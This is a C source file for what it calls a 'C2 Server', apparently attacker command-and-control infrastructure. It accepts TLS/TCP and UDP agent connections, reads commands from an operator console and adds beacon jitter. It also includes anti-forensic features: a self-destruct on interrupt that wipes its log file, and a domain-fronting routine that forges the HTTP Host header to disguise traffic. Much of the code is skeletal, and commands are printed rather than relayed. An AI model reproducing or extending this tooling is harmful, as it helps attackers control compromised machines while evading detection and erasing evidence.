#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <poll.h>
#include <pthread.h>
#include <signal.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <dirent.h>
#include <time.h>
#include <sys/syscall.h>
#include <sys/select.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <errno.h>
#include <netdb.h>

#define TCP_PORT 4433
#define UDP_PORT 4434
#define BUFFER_SIZE 4096
#define MAX_CONNECTIONS 10

// Global variables
SSL_CTX *ssl_ctx;
int tcp_server_socket;
int udp_server_socket;
int running = 1;
int use_tcp = 1; // 1 for TCP, 0 for UDP

// Function prototypes
void initialize_openssl();
void cleanup_openssl();
SSL_CTX* create_context();
void configure_context(SSL_CTX *ctx);
void handle_tcp_client(int client_socket, SSL *ssl);
void handle_udp_client(int client_socket);
void *client_thread(void *arg);
void self_destruct();
void log_cleaning();
void setup_signals();
void handle_sigint(int sig);
void add_jitter(int base_interval);
void *operator_thread(void *arg);
void domain_fronting_example();
void switch_protocol(int tcp);
void *udp_client_thread(void *arg);

int main() {
    struct sockaddr_in tcp_server_addr, udp_server_addr;
    struct sockaddr_in client_addr;
    socklen_t client_len = sizeof(client_addr);
    pthread_t thread_id;
    pthread_t operator_thread_id;

    // Initialize OpenSSL
    initialize_openssl();

    // Create SSL context
    ssl_ctx = create_context();
    configure_context(ssl_ctx);

    // Create TCP server socket
    tcp_server_socket = socket(AF_INET, SOCK_STREAM, 0);
    if (tcp_server_socket < 0) {
        perror("TCP Socket creation failed");
        exit(EXIT_FAILURE);
    }

    // Set up TCP server address
    memset(&tcp_server_addr, 0, sizeof(tcp_server_addr));
    tcp_server_addr.sin_family = AF_INET;
    tcp_server_addr.sin_addr.s_addr = INADDR_ANY;
    tcp_server_addr.sin_port = htons(TCP_PORT);

    // Bind TCP socket
    if (bind(tcp_server_socket, (struct sockaddr *)&tcp_server_addr, sizeof(tcp_server_addr)) < 0) {
        perror("TCP Bind failed");
        close(tcp_server_socket);
        exit(EXIT_FAILURE);
    }

    // Listen for TCP connections
    if (listen(tcp_server_socket, MAX_CONNECTIONS) < 0) {
        perror("TCP Listen failed");
        close(tcp_server_socket);
        exit(EXIT_FAILURE);
    }

    // Create UDP server socket
    udp_server_socket = socket(AF_INET, SOCK_DGRAM, 0);
    if (udp_server_socket < 0) {
        perror("UDP Socket creation failed");
        exit(EXIT_FAILURE);
    }

    // Set up UDP server address
    memset(&udp_server_addr, 0, sizeof(udp_server_addr));
    udp_server_addr.sin_family = AF_INET;
    udp_server_addr.sin_addr.s_addr = INADDR_ANY;
    udp_server_addr.sin_port = htons(UDP_PORT);

    // Bind UDP socket
    if (bind(udp_server_socket, (struct sockaddr *)&udp_server_addr, sizeof(udp_server_addr)) < 0) {
        perror("UDP Bind failed");
        close(udp_server_socket);
        exit(EXIT_FAILURE);
    }

    printf("C2 Server started on TCP port %d and UDP port %d\n", TCP_PORT, UDP_PORT);

    // Set up signal handlers
    setup_signals();

    // Start operator thread
    if (pthread_create(&operator_thread_id, NULL, operator_thread, NULL) != 0) {
        perror("Failed to create operator thread");
        close(tcp_server_socket);
        close(udp_server_socket);
        exit(EXIT_FAILURE);
    }

    // Accept and handle clients
    while (running) {
        fd_set readfds;
        int max_fd = (tcp_server_socket > udp_server_socket) ? tcp_server_socket : udp_server_socket;
        FD_ZERO(&readfds);
        FD_SET(tcp_server_socket, &readfds);
        FD_SET(udp_server_socket, &readfds);

        if (select(max_fd + 1, &readfds, NULL, NULL, NULL) < 0) {
            perror("Select failed");
            continue;
        }

        if (FD_ISSET(tcp_server_socket, &readfds)) {
            int client_socket = accept(tcp_server_socket, (struct sockaddr *)&client_addr, &client_len);
            if (client_socket < 0) {
                perror("TCP Accept failed");
                continue;
            }

            // Create a new thread for each TCP client
            if (pthread_create(&thread_id, NULL, client_thread, &client_socket) != 0) {
                perror("Failed to create TCP client thread");
                close(client_socket);
                continue;
            }

            // Detach the thread
            pthread_detach(thread_id);
        }

        if (FD_ISSET(udp_server_socket, &readfds)) {
            int client_socket = udp_server_socket;
            if (pthread_create(&thread_id, NULL, udp_client_thread, &client_socket) != 0) {
                perror("Failed to create UDP client thread");
                continue;
            }

            // Detach the thread
            pthread_detach(thread_id);
        }
    }

    // Clean up
    close(tcp_server_socket);
    close(udp_server_socket);
    cleanup_openssl();
    return 0;
}

void initialize_openssl() {
    SSL_load_error_strings();
    OpenSSL_add_ssl_algorithms();
}

void cleanup_openssl() {
    EVP_cleanup();
}

SSL_CTX* create_context() {
    const SSL_METHOD *method;
    SSL_CTX *ctx;

    method = TLS_server_method();

    ctx = SSL_CTX_new(method);
    if (!ctx) {
        perror("Unable to create SSL context");
        ERR_print_errors_fp(stderr);
        exit(EXIT_FAILURE);
    }

    return ctx;
}

void configure_context(SSL_CTX *ctx) {
    SSL_CTX_set_ecdh_auto(ctx, 1);

    // Load the server certificate and private key
    if (SSL_CTX_use_certificate_file(ctx, "server-cert.pem", SSL_FILETYPE_PEM) <= 0) {
        ERR_print_errors_fp(stderr);
        exit(EXIT_FAILURE);
    }

    if (SSL_CTX_use_PrivateKey_file(ctx, "server-key.pem", SSL_FILETYPE_PEM) <= 0) {
        ERR_print_errors_fp(stderr);
        exit(EXIT_FAILURE);
    }
}

void handle_tcp_client(int client_socket, SSL *ssl) {
    char buffer[BUFFER_SIZE];
    int bytes_read;

    while (running) {
        bytes_read = SSL_read(ssl, buffer, BUFFER_SIZE);
        if (bytes_read <= 0) {
            if (bytes_read < 0) {
                perror("SSL_read failed");
            }
            break;
        }

        // Process the received command
        buffer[bytes_read] = '\0';
        printf("Received TCP command: %s\n", buffer);

        // Send a response
        const char *response = "TCP Command received\n";
        SSL_write(ssl, response, strlen(response));

        // Add jitter to the sleep interval
        add_jitter(5);
        sleep(5);
    }

    // Clean up
    SSL_shutdown(ssl);
    SSL_free(ssl);
    close(client_socket);
}

void handle_udp_client(int client_socket) {
    char buffer[BUFFER_SIZE];
    struct sockaddr_in client_addr;
    socklen_t client_len = sizeof(client_addr);
    int bytes_read;

    while (running) {
        bytes_read = recvfrom(client_socket, buffer, BUFFER_SIZE, 0, (struct sockaddr *)&client_addr, &client_len);
        if (bytes_read <= 0) {
            if (bytes_read < 0) {
                perror("UDP recvfrom failed");
            }
            break;
        }

        // Process the received command
        buffer[bytes_read] = '\0';
        printf("Received UDP command: %s\n", buffer);

        // Send a response
        const char *response = "UDP Command received\n";
        sendto(client_socket, response, strlen(response), 0, (struct sockaddr *)&client_addr, client_len);

        // Add jitter to the sleep interval
        add_jitter(5);
        sleep(5);
    }
}

void *client_thread(void *arg) {
    int client_socket = *(int *)arg;
    SSL *ssl;

    // Create a new SSL state
    ssl = SSL_new(ssl_ctx);
    SSL_set_fd(ssl, client_socket);

    // Perform SSL handshake
    if (SSL_accept(ssl) <= 0) {
        perror("SSL_accept failed");
        SSL_free(ssl);
        close(client_socket);
        return NULL;
    }

    // Handle the TCP client
    handle_tcp_client(client_socket, ssl);

    return NULL;
}

void *udp_client_thread(void *arg) {
    int client_socket = *(int *)arg;

    // Handle the UDP client
    handle_udp_client(client_socket);

    return NULL;
}

void self_destruct() {
    printf("Self-destruct initiated\n");

    // Terminate all active sessions
    running = 0;

    // Wipe application logs and temporary artifacts
    log_cleaning();

    // Optionally remove itself from memory or overwrite process memory
    // This is complex and platform-specific, and may require additional code

    // Exit the program
    exit(EXIT_SUCCESS);
}

void log_cleaning() {
    // Scrub system and application logs
    // This is a simplified example and may need to be expanded
    printf("Cleaning logs\n");

    // Example: Clear a log file
    FILE *log_file = fopen("/var/log/c2server.log", "w");
    if (log_file) {
        fclose(log_file);
    }
}

void setup_signals() {
    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = handle_sigint;
    sigaction(SIGINT, &sa, NULL);
}

void handle_sigint(int sig) {
    printf("SIGINT received\n");
    self_destruct();
}

void add_jitter(int base_interval) {
    struct timespec ts;
    int jitter_ms = rand() % 100; // Random jitter between 0 and 100 milliseconds
    ts.tv_sec = base_interval;
    ts.tv_nsec = jitter_ms * 1000000; // Convert milliseconds to nanoseconds
    nanosleep(&ts, NULL);
}

void *operator_thread(void *arg) {
    char buffer[BUFFER_SIZE];

    while (running) {
        printf("Operator> ");
        if (fgets(buffer, BUFFER_SIZE, stdin) == NULL) {
            break;
        }

        // Process operator commands
        buffer[strcspn(buffer, "\n")] = '\0';
        printf("Operator command: %s\n", buffer);

        // Command to switch protocol
        if (strcmp(buffer, "switch_to_tcp") == 0) {
            switch_protocol(1);
        } else if (strcmp(buffer, "switch_to_udp") == 0) {
            switch_protocol(0);
        } else if (strcmp(buffer, "self_destruct") == 0) {
            self_destruct();
        } else {
            // Send command to all clients
            printf("Sending command to clients: %s\n", buffer);
        }

        // Add jitter to the sleep interval
        add_jitter(5);
        sleep(5);
    }

    return NULL;
}

void domain_fronting_example() {
    // Example of domain fronting
    // This is a simplified example and may need to be expanded
    printf("Domain fronting example\n");

    // Create a socket
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("Socket creation failed");
        return;
    }

    struct sockaddr_in server_addr;
    struct hostent *server;

    // Resolve the domain
    server = gethostbyname("example.com");
    if (server == NULL) {
        perror("Host not found");
        close(sock);
        return;
    }

    // Set up server address
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    memcpy(&server_addr.sin_addr.s_addr, server->h_addr, server->h_length);
    server_addr.sin_port = htons(443);

    // Connect to server
    if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("Connect failed");
        close(sock);
        return;
    }

    // Create a new SSL state
    SSL *ssl = SSL_new(ssl_ctx);
    SSL_set_fd(ssl, sock);

    // Perform SSL handshake
    if (SSL_connect(ssl) <= 0) {
        perror("SSL_connect failed");
        SSL_free(ssl);
        close(sock);
        return;
    }

    // Send HTTP request with Host header for domain fronting
    const char *http_request = "GET / HTTP/1.1\r\nHost: yourdomain.com\r\n\r\n";
    SSL_write(ssl, http_request, strlen(http_request));

    char buffer[BUFFER_SIZE];
    int bytes_read = SSL_read(ssl, buffer, BUFFER_SIZE);
    if (bytes_read > 0) {
        buffer[bytes_read] = '\0';
        printf("HTTP Response:\n%s\n", buffer);
    } else {
        perror("SSL_read failed");
    }

    // Clean up
    SSL_shutdown(ssl);
    SSL_free(ssl);
    close(sock);
}

void switch_protocol(int tcp) {
    use_tcp = tcp;
    if (use_tcp) {
        printf("Switched to TCP\n");
    } else {
        printf("Switched to UDP\n");
    }
}
